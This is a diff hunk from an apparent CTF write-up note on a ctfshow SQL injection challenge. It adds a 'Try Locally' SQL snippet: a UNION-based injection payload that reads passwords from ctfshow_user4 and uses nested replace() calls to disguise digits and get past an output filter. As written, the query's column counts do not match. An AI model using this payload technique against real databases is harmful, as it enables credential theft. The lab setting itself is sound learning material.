@@ -164,3 +164,6 @@ When we access the strings, we can use corresponding function to convert JSON st
 ![[Pasted image 20241221094901.png]]
 ![[Pasted image 20241221094942.png]]
 #### Try Locally
+```SQL
+select id, username, password from ctfshow_user4 where username != 'flag' and id = '999' union select replace(replace(replace(replace(password, '0', ')'), '1', '!'), '2', '@'), '3', '#') limit 1;
+```
